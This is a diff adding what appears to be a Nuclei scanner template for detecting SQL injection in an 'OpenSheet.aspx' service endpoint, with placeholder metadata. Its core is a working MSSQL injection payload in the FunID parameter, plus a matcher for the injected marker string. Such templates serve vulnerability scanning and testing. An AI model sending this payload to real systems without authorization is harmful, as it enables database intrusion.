@@ -1,0 +1,19 @@
+id: jjy-OpenSheet-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Service/OpenSheet.aspx?FunID=SJ086'+AND+6812+IN+(SELECT+(CHAR(113)%2bCHAR(113)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)%2b(SELECT+(CASE+WHEN+(6812%3d6812)+THEN+CHAR(49)+ELSE+CHAR(48)+END))%2bCHAR(113)%2bCHAR(107)%2bCHAR(106)%2bCHAR(113)%2bCHAR(113)))--&curDate="
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qqzzq1qkjqq'
